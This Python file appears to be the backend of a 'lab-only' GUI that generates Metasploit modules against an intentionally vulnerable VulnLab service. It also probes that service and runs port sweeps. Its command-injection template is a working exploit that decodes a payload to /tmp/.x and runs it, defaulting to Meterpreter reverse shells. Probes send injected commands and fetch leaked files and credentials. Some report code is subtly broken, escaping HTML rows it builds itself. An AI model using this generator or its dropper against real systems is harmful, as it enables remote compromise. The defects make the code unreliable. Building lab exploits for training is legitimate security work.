# -*- coding: utf-8 -*-
"""module_builder.py - backend for the MSF Lab Module Studio GUI.

Provides
    VULN_TEMPLATES            : catalog of lab vulnerability classes
    MetasploitModuleGenerator : builds the Ruby Metasploit module source
    LabServiceProbe           : talks to the lab-only vulnerable service
    scan_tcp_ports            : small TCP port sweep
    LabHtmlReport             : builds the downloadable HTML/JSON report

This tool is for DEFENSIVE training / lab usage only.
"""
from __future__ import annotations

import html as _html
import json
import platform
import socket
import time
import uuid
from dataclasses import dataclass, field
from datetime import datetime
from typing import Any, Dict, List, Optional, Tuple
from urllib.parse import quote


# --------------------------------------------------------------------------
# Metadata / catalog
# --------------------------------------------------------------------------
APP_NAME = "MSF-Lab-Module-Studio"
APP_VERSION = "2.0.0"

DEFAULT_TARGET = "127.0.0.1"
DEFAULT_PORT = 8080
DEFAULT_URI = "/exec"
HEALTH_URI = "/health"
BANNER_MARKER = "VulnLab-Service v1.0"

COMMON_PORTS = [22, 80, 443, 8000, 8080, 8081, 8888, 9000]

PAYLOAD_CHOICES = [
    ("Linux x86_64 Meterpreter Reverse Shell", "linux/x64/meterpreter/reverse_tcp", "x64", "linux"),
    ("Linux x86 Meterpreter Reverse Shell", "linux/x86/meterpreter/reverse_tcp", "x86", "linux"),
    ("PHP Meterpreter Reverse Shell", "php/meterpreter/reverse_tcp", "php", "php"),
    ("Linux Base64 Command (cmd/unix)", "cmd/unix/reverse_bash", "cmd", "linux"),
]

MODULE_CATEGORIES = [
    "exploit/multi/http",
    "exploit/linux/http",
    "exploit/windows/http",
    "auxiliary/scanner/http",
]


def build_module_id(module_name: str) -> str:
    """Derive a human-safe module reference."""
    return "".join(ch for ch in module_name if ch.isalnum() or ch in "._-/-").replace("/", "_")


# --------------------------------------------------------------------------
# Lab vulnerability templates
# --------------------------------------------------------------------------
@dataclass
class VulnTemplate:
    tid: str
    label: str
    module_class: str          # "exploit" or "auxiliary/scanner"
    module_name: str           # msf path
    cli_name: str
    description: str
    reference: str
    cve_id: str
    default_uri: str
    health_marker: str         # substring the health banner must contain
    detect_detail: str         # human explanation when matched


VULN_TEMPLATES: List[VulnTemplate] = [
    VulnTemplate(
        tid="cmd-injection",
        label="Command Injection (RCE via /exec)",
        module_class="exploit",
        module_name="exploit/linux/http/vulnlab_exec",
        cli_name="VulnLab Exec Command Injection (Lab Only)",
        description=(
            "Exploits an intentional OS-command injection in the LAB-ONLY "
            "VulnLab service's /exec endpoint to gain command execution. "
            "This module is for authorized lab exercises only."
        ),
        reference="CVE-2026-LAB-0001",
        cve_id="2026-LAB-0001",
        default_uri="/exec",
        health_marker="VulnLab-Service v1.0",
        detect_detail=(
            "The service echoed a marker back through /exec?cmd= - the command "
            "injection primitive is live and returns OS output."
        ),
    ),
    VulnTemplate(
        tid="path-traversal",
        label="Path Traversal (file disclosure via /file)",
        module_class="auxiliary/scanner",
        module_name="auxiliary/scanner/http/vulnlab_traversal",
        cli_name="VulnLab Path Traversal Disclosure (Lab Only)",
        description=(
            "Calls the LAB-ONLY VulnLab service's /file endpoint with an "
            "untrusted filename to retrieve files outside the web root "
            "(path traversal). This module is for authorized lab exercises only."
        ),
        reference="CVE-2026-LAB-0002",
        cve_id="2026-LAB-0002",
        default_uri="/file",
        health_marker="VulnLab-Service v1.0",
        detect_detail=(
            "Requesting name=flag through /file returned leaked content plus a "
            "traversal marker - files can be retrieved outside the web root."
        ),
    ),
    VulnTemplate(
        tid="config-leak",
        label="Config Disclosure (unauth /backup)",
        module_class="auxiliary/scanner",
        module_name="auxiliary/scanner/http/vulnlab_backup",
        cli_name="VulnLab Backup Config Disclosure (Lab Only)",
        description=(
            "Fetches the LAB-ONLY VulnLab service's /backup endpoint which "
            "returns a simulated configuration dump (including a plaintext "
            "database password) without authentication. This module is for "
            "authorized lab exercises only."
        ),
        reference="CVE-2026-LAB-0003",
        cve_id="2026-LAB-0003",
        default_uri="/backup",
        health_marker="VulnLab-Service v1.0",
        detect_detail=(
            "/backup answered with a configuration dump containing "
            "db_password - sensitive data is exposed without authentication."
        ),
    ),
]

VULN_TEMPLATES_BY_ID = {t.tid: t for t in VULN_TEMPLATES}


# --------------------------------------------------------------------------
# Ruby source templates (token placeholders, brace-safe)
# --------------------------------------------------------------------------
_CMDI_RUBY = r"""##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote::HttpClient
  Rank = @@RANK@@

  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name'        => '@@CLI@@',
        'Description' => %q{@@DESC@@},
        'Author'      => ['@@AUTHOR@@'],
        'License'     => @@LICENSE@@,
        'References'  => [['CVE', '@@CVEID@@']],
        'Platform'    => ['linux'],
        'Arch'        => ARCH_X64,
        'Targets'     => [['Automatic', {}], ['Lab Box (linux)', {'Platform' => 'linux', 'Arch' => ARCH_X64}]],
        'Payload'     => {
          'BadChars'    => "@@BADCHARS@@",
          'DisableNops' => true
        },
        'DefaultOptions' => { 'PAYLOAD' => '@@PAYLOAD@@', 'LHOST' => '127.0.0.1', 'LPORT' => 4444, 'WfsDelay' => 30 },
        'DefaultTarget'  => 0,
        'DisclosureDate' => '@@DATE@@'
      )
    )
    register_options(
      [
        OptString.new('TARGETURI', [true, 'Vulnerable endpoint', '@@URI@@'])
      ]
    )
  end

  def check
    begin
      res = send_request_cgi('uri' => '/health', 'method' => 'GET')
    rescue ::Rex::ConnectionError
      return CheckCode::Unknown('Could not connect to @@BADGE@@')
    end
    return CheckCode::Safe unless res && res.code == 200
    return CheckCode::Vulnerable('Lab banner detected: ' + res.body.to_s.strip) if res.body.to_s.include?('@@MARKER@@')
    CheckCode::Safe
  end

  def exploit
    encoded = Rex::Text.encode_base64(payload.encoded)
    runner  = "echo #{encoded} | base64 -d > /tmp/.x; chmod +x /tmp/.x; /tmp/.x"
    injected = "$(#{runner})"
    uri = normalize_uri(target_uri.path)
    print_status("Injecting command into #{uri} ...")
    res = send_request_cgi(
      'uri' => uri,
      'method' => 'GET',
      'vars_get' => { 'cmd' => injected }
    )
    if res
      print_good('Received HTTP %d' % res.code)
      vprint_line(res.body.to_s)
    else
      fail_with(Failure::Unreachable, 'No response from target')
    end
  end
end
"""

_TRAVERSAL_RUBY = r"""##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary::Scanner
  include Msf::Auxiliary::Scanner
  include Msf::Auxiliary::Report

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name'        => '@@CLI@@',
        'Description' => %q{@@DESC@@},
        'Author'      => ['@@AUTHOR@@'],
        'License'     => @@LICENSE@@,
        'References'  => [['CVE', '@@CVEID@@']],
        'DisclosureDate' => '@@DATE@@'
      )
    )
    register_options(
      [
        OptString.new('TARGETURI', [true, 'Vulnerable endpoint', '@@URI@@']),
        OptString.new('FILE', [true, 'File to retrieve through the traversal', 'flag'])
      ]
    )
  end

  def run_host(ip)
    path = normalize_uri(target_uri.path)
    res = send_request_cgi('uri' => path, 'method' => 'GET', 'vars_get' => { 'name' => datastore['FILE'] })
    return unless res && res.code == 200
    body = res.body.to_s
    print_good("Retrieved #{datastore['FILE']} from #{ip}:#{rport} (#{body.length} bytes)")
    report_web_vuln(
      host: ip, port: rport, ssl: ssl?, path: path, method: 'GET',
      name: name, category: 'web', confidence: 100,
      description: 'Path traversal in the file picker', pname: 'name',
      proof: body[0, 256]
    )
    store_loot('lab.traversal', 'text/plain', ip, body, datastore['FILE'], name)
    vprint_line(body)
  end
end
"""

_BACKUP_RUBY = r"""##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary::Scanner
  include Msf::Auxiliary::Scanner
  include Msf::Auxiliary::Report

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name'        => '@@CLI@@',
        'Description' => %q{@@DESC@@},
        'Author'      => ['@@AUTHOR@@'],
        'License'     => @@LICENSE@@,
        'References'  => [['CVE', '@@CVEID@@']],
        'DisclosureDate' => '@@DATE@@'
      )
    )
    register_options(
      [
        OptString.new('TARGETURI', [true, 'Vulnerable endpoint', '@@URI@@'])
      ]
    )
  end

  def run_host(ip)
    path = normalize_uri(target_uri.path)
    res = send_request_cgi('uri' => path, 'method' => 'GET')
    return unless res && res.code == 200
    body = res.body.to_s
    print_good("Disclosed config dump from #{ip}:#{rport} (#{body.length} bytes)")
    report_note(host: ip, port: rport, ssl: ssl?, type: 'lab.backup_config', data: body, update: :unique_data)
    store_loot('lab.backup_config', 'text/plain', ip, body, 'backup.txt', name)
    vprint_line(body)
  end
end
"""

_RUBY_TEMPLATES = {
    "cmd-injection": _CMDI_RUBY,
    "path-traversal": _TRAVERSAL_RUBY,
    "config-leak": _BACKUP_RUBY,
}


def build_module_source(template_id: str, cfg: Dict[str, Any]) -> str:
    """Render a Ruby Metasploit module for the given template + config."""
    tpl = VULN_TEMPLATES_BY_ID[template_id]
    src = _RUBY_TEMPLATES[template_id]
    replacements = {
        "@@CLI@@": _ruby_escape(cfg.get("cli_name") or tpl.cli_name),
        "@@DESC@@": (cfg.get("description") or tpl.description).replace("{", "").replace("}", ""),
        "@@AUTHOR@@": _ruby_escape(cfg.get("author") or "MSF Lab Author"),
        "@@LICENSE@@": cfg.get("license") or "MSF_LICENSE",
        "@@CVEID@@": (cfg.get("cve_id") or tpl.cve_id).split("-", 1)[-1],
        "@@DATE@@": cfg.get("disclosure_date") or "2026-09-19",
        "@@RANK@@": cfg.get("default_rank") or "ExcellentRanking",
        "@@GLOBAL@@": "-",
        "@@PAYLOAD@@": cfg.get("payload_name") or "linux/x64/meterpreter/reverse_tcp",
        "@@BADCHARS@@": (cfg.get("badchars") or "\\x00").replace("\\", "\\"),
        "@@URI@@": _ruby_escape(cfg.get("target_uri") or tpl.default_uri),
        "@@MARKER@@": tpl.health_marker,
        "@@BADGE@@": "%s:%s%s" % (cfg.get("target_host"), cfg.get("target_port"),
                                  cfg.get("target_uri")),
    }
    for token, value in replacements.items():
        src = src.replace(token, value)
    return src


def _ruby_escape(value: str) -> str:
    return value.replace("\\", "\\\\").replace("'", "\\\\'").replace("\n", "\\n")


# --------------------------------------------------------------------------
# Ruby Metasploit module generator
# --------------------------------------------------------------------------
class MetasploitModuleGenerator:
    """Holds the current builder options and renders the Ruby module."""

    def __init__(self) -> None:
        tpl = VULN_TEMPLATES[0]
        self.template_id: str = tpl.tid
        self.module_name: str = tpl.module_name
        self.cli_name: str = tpl.cli_name
        self.description: str = tpl.description
        self.reference: str = tpl.reference
        self.cve_id: str = tpl.cve_id
        self.author: str = "MSF Lab Author"
        self.target_host: str = DEFAULT_TARGET
        self.target_port: int = DEFAULT_PORT
        self.target_uri: str = tpl.default_uri
        self.payload_name: str = PAYLOAD_CHOICES[0][1]
        self.payload_arch: str = PAYLOAD_CHOICES[0][2]
        self.badchars: str = "\\x00"
        self.default_rank: str = "ExcellentRanking"
        self.disclosure_date: str = "2026-09-19"
        self.license: str = "MSF_LICENSE"

    def adopt_template(self, template_id: str) -> None:
        tpl = VULN_TEMPLATES_BY_ID[template_id]
        self.template_id = template_id
        self.module_name = tpl.module_name
        self.cli_name = tpl.cli_name
        self.description = tpl.description
        self.reference = tpl.reference
        self.cve_id = tpl.cve_id
        self.target_uri = tpl.default_uri

    def to_dict(self) -> Dict[str, Any]:
        tpl = VULN_TEMPLATES_BY_ID[self.template_id]
        return {
            "template_id": self.template_id,
            "module_class": tpl.module_class,
            "module_name": self.module_name,
            "cli_name": self.cli_name,
            "description": self.description,
            "reference": self.reference,
            "cve_id": self.cve_id,
            "author": self.author,
            "target_host": self.target_host,
            "target_port": self.target_port,
            "target_uri": self.target_uri,
            "payload_name": self.payload_name,
            "payload_arch": self.payload_arch,
            "badchars": self.badchars,
            "default_rank": self.default_rank,
            "disclosure_date": self.disclosure_date,
            "license": self.license,
        }

    def generate(self) -> str:
        return build_module_source(self.template_id, self.to_dict())


# --------------------------------------------------------------------------
# Live probing / detection / port scan
# --------------------------------------------------------------------------
class _RawHttp:
    """Minimal HTTP/1.0 GET client (stdlib only)."""

    def __init__(self, host: str, port: int, timeout: float = 5.0):
        self.host = host
        self.port = port
        self.timeout = timeout

    def get(self, path_query: str, headers: Optional[Tuple[str, str]] = None) -> Tuple[int, str, Optional[str]]:
        """Returns (status, body, error)."""
        path = quote(path_query if path_query.startswith("/") else "/" + path_query,
                     safe="/?=&%")
        try:
            with socket.create_connection((self.host, self.port), timeout=self.timeout) as sock:
                req = ("GET %s HTTP/1.0\r\nHost: %s:%d\r\n" % (path, self.host, self.port))
                if headers:
                    for k, v in headers:
                        req += "%s: %s\r\n" % (k, v)
                req += "\r\n"
                sock.sendall(req.encode("utf-8"))
                sock.settimeout(self.timeout)
                data = b""
                while True:
                    chunk = sock.recv(4096)
                    if not chunk:
                        break
                    data += chunk
                    if len(data) > 65536:
                        break
        except OSError as exc:
            return 0, "", getattr(exc, "strerror", None) or str(exc)
        text = data.decode("utf-8", "replace")
        head, sep, body = text.partition("\r\n\r\n")
        if not sep:  # tolerate LF-only
            head, sep, body = text.partition("\n\n")
        status = 0
        if head.lower().startswith("http/"):
            try:
                status = int(head.split(" ", 2)[1])
            except (IndexError, ValueError):
                status = 0
        return status, body, None


class LabServiceProbe:
    """Probes the lab service and detects which vulnerabilities are live."""

    def __init__(self, host: str = DEFAULT_TARGET, port: int = DEFAULT_PORT) -> None:
        self.host = host
        self.port = port
        self.timeout = 6.0

    @staticmethod
    def _parse_port(value: Any) -> int:
        try:
            return int(value)
        except (TypeError, ValueError):
            return DEFAULT_PORT

    def _http(self, host: str = None, port: int = None) -> _RawHttp:
        return _RawHttp(host or self.host, self._parse_port(port or self.port), self.timeout)

    def probe(self, host: str = None, port: int = None) -> Dict[str, Any]:
        """Health-banner fingerprint (reachability + lab marker)."""
        host = host or self.host
        port = self._parse_port(port or self.port)
        out: Dict[str, Any] = {
            "probe_ts": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            "host": host,
            "port": port,
            "reachable": False,
            "health_code": None,
            "banner": None,
            "vulnlab": False,
            "warning": None,
        }
        status, body, err = self._http(host, port).get(HEALTH_URI)
        if err:
            out["warning"] = err
        else:
            out["reachable"] = True
            out["health_code"] = status
            out["banner"] = "HTTP/1.0 %d OK" % status if status else "unparsed response"
            out["vulnlab"] = BANNER_MARKER in body
        return out

    def detect_all(self, host: str = None, port: int = None) -> Dict[str, Any]:
        """Run every template's probe. Returns per-template verdicts + summary."""
        host = host or self.host
        port = self._parse_port(port or self.port)
        base = self.probe(host, port)
        results: Dict[str, Any] = {"base": base, "checks": {}, "open_vulns": [], "summary": "Unknown"}
        if not base["reachable"]:
            results["summary"] = "Target unreachable"
            return results

        checks = {
            "cmd-injection": self.check_cmd_injection,
            "path-traversal": self.check_path_traversal,
            "config-leak": self.check_config_leak,
        }
        for tid, fn in checks.items():
            r = fn(host, port)
            results["checks"][tid] = r
            if r["detected"]:
                results["open_vulns"].append(tid)

        if results["open_vulns"]:
            results["summary"] = "Vulnerable"
        elif base["vulnlab"]:
            results["summary"] = "Lab identified, no lab vuln matched"
        else:
            results["summary"] = "No lab service matched"
        return results

    def check_cmd_injection(self, host: str = None, port: int = None) -> Dict[str, Any]:
        probe = self.probe(host, port)
        r = {"template": "cmd-injection", "ts": datetime.now().strftime("%H:%M:%S"),
             "detected": False, "detail": "No command output echoed back.", "evidence": None}
        if not probe["reachable"]:
            r["detail"] = "Target unreachable."
            return r
        status, body, err = self._http(host, port).get(
            "/exec?cmd=" + "echo VULNLAB_PROBE_MARKER")
        r["evidence"] = (body or err or "")[:220]
        if status == 200 and "VULNLAB_PROBE_MARKER" in (body or ""):
            r["detected"] = True
            r["detail"] = ("Command injection live: /exec echoed our marker back "
                           "in the HTTP response (OS command output).")
        return r

    def check_path_traversal(self, host: str = None, port: int = None) -> Dict[str, Any]:
        probe = self.probe(host, port)
        r = {"template": "path-traversal", "ts": datetime.now().strftime("%H:%M:%S"),
             "detected": False, "detail": "No traversal marker in /file response.", "evidence": None}
        if not probe["reachable"]:
            r["detail"] = "Target unreachable."
            return r
        status, body, err = self._http(host, port).get("/file?name=flag")
        r["evidence"] = (body or err or "")[:220]
        if status == 200 and ("FLAG:" in (body or "") or "traversal" in (body or "").lower()):
            r["detected"] = True
            r["detail"] = ("Path traversal confirmed: /file returned file content "
                           "outside the web root (flag retrieved).")
        return r

    def check_config_leak(self, host: str = None, port: int = None) -> Dict[str, Any]:
        probe = self.probe(host, port)
        r = {"template": "config-leak", "ts": datetime.now().strftime("%H:%M:%S"),
             "detected": False, "detail": "/backup did not disclose config data.", "evidence": None}
        if not probe["reachable"]:
            r["detail"] = "Target unreachable."
            return r
        status, body, err = self._http(host, port).get("/backup")
        r["evidence"] = (body or err or "")[:220]
        if status == 200 and "db_password" in (body or ""):
            r["detected"] = True
            r["detail"] = ("Unauthenticated config disclosure: /backup exposed "
                           "plaintext credentials (db_password).")
        return r

    def run_check(self, host: str = None, port: int = None,
                  uri: str = "/exec") -> Dict[str, Any]:
        """Metasploit-style `check` for the currently selected template."""
        probe = self.probe(host, port)
        check: Dict[str, Any] = {
            "probe": probe,
            "check_ts": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            "state": "Safe",
            "detail": "No lab banner detected on the target.",
        }
        if not probe["reachable"]:
            check["state"] = "Unknown"
            check["detail"] = "Target unreachable (%s)" % (probe["warning"] or "no route")
        elif probe["vulnlab"]:
            check["state"] = "Vulnerable"
            check["detail"] = ("VulnLab lab service detected. Module `check` returns "
                               "CheckCode::Vulnerable - proceed in the lab only.")
        else:
            check["state"] = "Safe"
            check["detail"] = "Target answered but the lab banner '%s' was not found." % BANNER_MARKER
        check["banner"] = probe.get("banner")
        return check


def scan_tcp_ports(host: str, ports: List[int], timeout: float = 0.6) -> List[int]:
    """Return the subset of `ports` that accept a TCP connect."""
    open_ports: List[int] = []
    for port in sorted(set(ports)):
        try:
            with socket.create_connection((host, port), timeout=timeout):
                open_ports.append(port)
        except OSError:
            continue
    return open_ports


# --------------------------------------------------------------------------
# HTML / JSON report
# --------------------------------------------------------------------------
_CSS = """
:root { --teal:#0e8c99; --teal-d:#085f73; --teal-l:#b8e6e8; --mint:#e7f5f3;
        --card:#ffffff; --ink:#164a56; --acc:#e8734a; --base:#eef8f7; }
* { box-sizing: border-box; }
body { margin:0; font-family:'Segoe UI',Verdana,sans-serif; background:var(--base); color:var(--ink); }
header { background:linear-gradient(135deg,#16c9a0 0%, #0e8c99 55%, #085f73 100%);
         color:#fff; padding:26px 34px; }
header h1 { margin:0; font-size:22px; }
header p { margin:4px 0 0; opacity:.92; font-size:13px; }
.wrap { padding:24px 34px; }
.card { background:var(--card); border:1px solid #cde7e6; border-left:5px solid var(--teal);
        border-radius:8px; padding:16px 20px; margin-bottom:18px; box-shadow:0 2px 6px rgba(14,140,153,.08); }
.card h2 { margin:0 0 10px; font-size:15px; color:var(--teal-d); text-transform:uppercase; letter-spacing:.6px; }
table { border-collapse:collapse; width:100%; }
th,td { text-align:left; padding:7px 10px; font-size:13px; border-bottom:1px solid #e3f0ef; }
th { background:#d7efee; color:var(--teal-d); }
code,pre { font-family:Consolas,'Courier New',monospace; background:#eefcfa; border:1px solid #cde7e6; border-radius:5px; }
pre { padding:12px; font-size:12px; line-height:1.45; overflow-x:auto; white-space:pre-wrap; }
.badge { display:inline-block; padding:3px 10px; border-radius:12px; font-size:12px; font-weight:600; }
.b-safe { background:#e7f7ee; color:#1a8a4f; }
.b-vuln { background:#fdeceb; color:#c0392b; }
.b-unk  { background:#fdf3e0; color:#b9770e; }
.warn { border-left-color:var(--acc); }
.foot { color:#60939c; font-size:11.5px; text-align:center; padding:14px; }
"""


class LabHtmlReport:
    """Builds a styled, self-contained HTML report + a JSON twin."""

    def __init__(self, cfg: Dict[str, Any], check: Optional[Dict[str, Any]] = None,
                 history: Optional[List[Dict[str, Any]]] = None,
                 scan: Optional[List[int]] = None) -> None:
        self.cfg = cfg or {}
        self.check = check or {}
        self.history = history or []
        self.scan = scan or []
        self.generated_at = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        self.report_id = uuid.uuid4().hex[:8].upper()

    # ---------------------------------------------------------------- json
    def to_dict(self) -> Dict[str, Any]:
        return {
            "report_id": self.report_id,
            "generated_at": self.generated_at,
            "app": {"name": APP_NAME, "version": APP_VERSION},
            "target": {
                "host": self.cfg.get("target_host"),
                "port": self.cfg.get("target_port"),
                "uri": self.cfg.get("target_uri"),
            },
            "module": {
                "template": self.cfg.get("template_id"),
                "module_name": self.cfg.get("module_name"),
                "cli_name": self.cfg.get("cli_name"),
                "reference": self.cfg.get("reference"),
                "payload": self.cfg.get("payload_name"),
                "rank": self.cfg.get("default_rank"),
                "author": self.cfg.get("author"),
            },
            "check": self.check,
            "port_scan": self.scan,
            "history": self.history,
            "module_source": self.cfg.get("module_source"),
        }

    def to_json(self) -> str:
        data = self.to_dict()
        if data.get("module_source"):
            pass  # keep source; it's JSON-safe
        return json.dumps(data, indent=2, ensure_ascii=False)

    # ---------------------------------------------------------------- html
    @staticmethod
    def _row(k: str, v: Any) -> str:
        return "<tr><td><b>%s</b></td><td>%s</td></tr>" % (
            _html.escape(k), LabHtmlReport._fmt(v))

    @staticmethod
    def _fmt(value: Any) -> str:
        if value is None:
            return '<span style="color:#94a7ad">n/a</span>'
        return _html.escape(str(value)).replace("\n", "<br>")

    def to_html(self) -> str:
        c = self.cfg
        probe = self.check.get("probe") or {}
        state = self.check.get("state", "Not scanned")
        badge = {
            "Vulnerable": '<span class="badge b-vuln">VULNERABLE</span>',
            "Safe": '<span class="badge b-safe">SAFE</span>',
            "Unknown": '<span class="badge b-unk">UNKNOWN</span>',
        }.get(state, '<span class="badge b-unk">%s</span>' % _html.escape(state))

        module_src = c.get("module_source") or ""
        name = c.get("module_name") or "exploit/linux/http/vulnlab_exec"

        rows_overview = "".join(
            self._row(k, v)
            for k, v in [
                ("Module", name),
                ("Template", c.get("template_id")),
                ("Friendly name", c.get("cli_name")),
                ("Reference", c.get("reference")),
                ("Target", "%s:%s%s" % (c.get("target_host"), c.get("target_port"), c.get("target_uri"))),
                ("Payload", c.get("payload_name")),
                ("Rank", c.get("default_rank")),
                ("Author", c.get("author")),
                ("Report ID", self.report_id),
                ("Generated", self.generated_at),
            ]
        )

        rows_probe = "".join(
            self._row(k, v)
            for k, v in [
                ("Probe time", probe.get("probe_ts")),
                ("Reachable", "yes" if probe.get("reachable") else "no"),
                ("HTTP status", probe.get("health_code") or "n/a"),
                ("Lab marker detected", "yes" if probe.get("vulnlab") else "no"),
                ("Warning", probe.get("warning")),
            ]
        )

        # history timeline
        history_rows = ""
        if self.history:
            history_rows = "".join(
                "<tr><td>%s</td><td>%s</td><td>%s</td><td>%s</td></tr>" % (
                    _html.escape(str(h.get("ts", ""))),
                    _html.escape(h.get("kind", "")),
                    _html.escape(str(h.get("detail", ""))[:90]),
                    _html.escape(h.get("verdict", "")))
                for h in self.history[-12:])
            history_rows = ("<table><tr><th>time</th><th>action</th><th>detail</th>"
                            "<th>verdict</th></tr>%s</table>" % history_rows)
        else:
            history_rows = '<p style="color:#94a7ad">No live-test activity recorded.</p>'

        # port scan
        if self.scan:
            ports_html = " ".join('<code>%d</code>' % p for p in sorted(self.scan))
        else:
            ports_html = '<span style="color:#94a7ad">no ports recorded open (or scan not run)</span>'

        # vulnerability detection table (from history, latest detect_all)
        vuln_rows = ""
        detect = c.get("last_detect")
        if isinstance(detect, dict) and detect.get("checks"):
            rows = ""
            for tid, r in detect["checks"].items():
                mark = "yes" if r.get("detected") else "no"
                rows += "<tr><td><code>%s</code></td><td>%s</td><td>%s</td></tr>" % (
                    _html.escape(tid), mark, _html.escape((r.get("detail") or "")[:150]))
            vuln_rows = ("<table><tr><th>template</th><th>detected</th><th>evidence</th></tr>%s</table>" % rows)
        else:
            vuln_rows = '<p style="color:#94a7ad">No auto-detection run performed yet.</p>'

        return """<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>%s - Lab Module Report</title>
<style>%s</style>
</head>
<body>
<header>
  <h1>MSF Lab Module Studio - Security Report</h1>
  <p>Custom Metasploit module for a LAB-ONLY vulnerable service | generated %s</p>
</header>
<div class="wrap">

  <div class="card">
    <h2>Target verification (module `check`)</h2>
    <p>Result: %s %s</p>
    <table>%s</table>
  </div>

  <div class="card">
    <h2>Vulnerability auto-detection</h2>
    %s
  </div>

  <div class="card">
    <h2>Module overview</h2>
    <table>%s</table>
  </div>

  <div class="card">
    <h2>Activity timeline (last 12)</h2>
    %s
  </div>

  <div class="card">
    <h2>TCP port scan</h2>
    <p>Open ports on %s: %s</p>
  </div>

  <div class="card">
    <h2>Generated Ruby module source</h2>
    <pre>%s</pre>
  </div>

  <div class="card warn">
    <h2>Usage &amp; safety notice</h2>
    <table>
      <tr><td><b>Scope</b></td><td>Authorized penetration testing labs / CTF islands only.</td></tr>
      <tr><td><b>Deploy</b></td><td><code>cp vulnlab.rb ~/.msf4/modules/</code> under the matching path, then <code>reload_all</code> in msfconsole.</td></tr>
      <tr><td><b>Run</b></td><td><code>use %s; set RHOSTS %s; set RPORT %s; check</code> (exploits) or <code>run</code> (auxiliaries).</td></tr>
      <tr><td><b>Responsibility</b></td><td>Never point this at a system you do not own or lack written permission to test.</td></tr>
    </table>
  </div>

  <div class="foot">Generated by %s v%s - lab training tool, not a production scanner.</div>
</div>
</body>
</html>
""" % (
            _html.escape(name),
            _CSS,
            self.generated_at,
            badge,
            self._fmt(self.check.get("detail") or self.check.get("check_ts") or ""),
            self._fmt(rows_probe),
            vuln_rows,
            self._fmt(rows_overview),
            history_rows,
            _html.escape(str(c.get("target_host", ""))),
            ports_html,
            _html.escape(module_src),
            _html.escape(name),
            _html.escape(str(c.get("target_host", ""))),
            _html.escape(str(c.get("target_port", ""))),
            _html.escape(APP_NAME),
            _html.escape(APP_VERSION),
        )


def default_config(template_id: str = "cmd-injection") -> Dict[str, Any]:
    gen = MetasploitModuleGenerator()
    gen.adopt_template(template_id)
    source = gen.generate()
    cfg = gen.to_dict()
    cfg["module_source"] = source
    cfg["studio_version"] = APP_VERSION
    cfg["template_label"] = VULN_TEMPLATES_BY_ID[template_id].label
    cfg["last_detect"] = None
    return cfg